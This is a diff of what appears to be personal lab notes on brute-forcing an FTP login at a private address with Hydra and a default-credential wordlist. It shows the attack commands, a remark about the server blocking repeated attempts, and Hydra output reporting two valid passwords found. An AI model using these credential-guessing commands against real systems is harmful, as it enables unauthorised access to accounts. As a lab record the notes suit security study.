@@ -1,3 +1,5 @@
+wordlists: `dpl4hydra_unix.lst`, 
+
 `dpl4hydra unix` -> create `~/.dpl4hydra/dpl4hydra_unix.lst`
 
 `sudo hydra -C .dpl4hydra/dpl4hydra_unix.lst -e rn -o output_hydra1 ftp://10.0.2.5 -v`
@@ -87,7 +89,7 @@ The session file ./hydra.restore was written. Type "hydra -R" to resume session.
 ```
  (UNKNOWN) [10.0.2.5] 21 (ftp) : Connection refused
 ```
-so "Dos" again. I'm begginig to think that ftp block incoming connections after several unsuccessfull attempts for a little time.
+so "Dos" again. I'm beggining to think that ftp block incoming connections after several unsuccessfull attempts for a little time.
 
 `netcat` claim that FTP is up again
 
@@ -102,3 +104,4 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-13 17:38:
 [STATUS] attack finished for 10.0.2.5 (waiting for children to complete tests)
 1 of 1 target successfully completed, 2 valid passwords found
 ```
+done
